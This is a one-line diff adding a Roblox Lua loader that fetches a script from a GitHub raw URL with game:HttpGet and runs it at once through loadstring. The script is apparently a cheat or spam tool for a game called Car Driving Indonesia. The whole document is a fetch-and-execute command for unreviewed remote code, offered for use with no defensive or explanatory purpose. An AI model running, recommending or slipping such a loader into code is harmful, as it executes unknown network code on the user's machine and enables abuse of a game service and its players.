@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Docktuangular/loaders/main/loaders/car-driving-indonesia-spam2-pgsvp3zvo43erh.lua"))()
